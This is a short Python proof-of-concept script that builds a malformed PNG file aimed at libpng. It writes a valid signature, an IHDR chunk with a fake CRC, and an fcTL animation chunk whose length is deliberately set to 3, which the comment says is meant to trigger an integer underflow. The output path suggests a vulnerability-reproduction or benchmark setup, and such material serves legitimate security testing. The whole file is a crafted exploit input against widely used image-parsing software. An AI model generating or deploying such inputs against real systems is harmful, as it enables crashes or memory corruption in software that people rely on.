
import struct
def create_poc(filename):
    # PNG signature
    png_sig = b'\x89PNG\r\n\x1a\n'
    # IHDR chunk (length=13)
    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 6, 0, 0, 0)
    ihdr_len = struct.pack('>I', len(ihdr_data))
    ihdr_type = b'IHDR'
    ihdr_crc = b'\x00\x00\x00\x00'  # fake CRC
    ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc
    # fcTL chunk with length=3 (less than 4 to trigger underflow)
    fcTL_len = struct.pack('>I', 3)
    fcTL_type = b'fcTL'
    fcTL_data = b'ABC'  # 3 bytes data
    fcTL_crc = b'\x00\x00\x00\x00'  # fake CRC
    fcTL_chunk = fcTL_len + fcTL_type + fcTL_data + fcTL_crc
    # Compose PNG file
    with open(filename, 'wb') as f:
        f.write(png_sig)
        f.write(ihdr_chunk)
        f.write(fcTL_chunk)

create_poc('poc/libpng/input.txt')
print('poc/libpng/input.txt')
